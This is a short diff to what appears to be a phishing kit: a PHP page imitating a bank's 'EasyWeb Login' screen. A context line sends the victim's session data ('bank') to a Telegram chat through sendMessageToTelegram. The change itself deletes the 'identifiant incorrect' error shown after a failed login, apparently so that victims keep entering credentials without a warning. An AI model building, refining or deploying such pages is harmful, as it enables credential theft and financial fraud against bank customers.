@@ -436,10 +436,7 @@ sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡');
               <div _ngcontent-egd-c151="" class="row">
                 <div _ngcontent-egd-c151="" class="col-xs-12">
                   <h1 _ngcontent-egd-c151="" class="co-brand-header">EasyWeb Login</h1>
-                  <?php if ( $_SESSION["try"] > 0 ):?>
-                                  <span style="color:red ; font-weight: bold" > identifiant incorrect </span>
-                                 
-                                  <?php endif ?>
+              
                 </div>
 
          
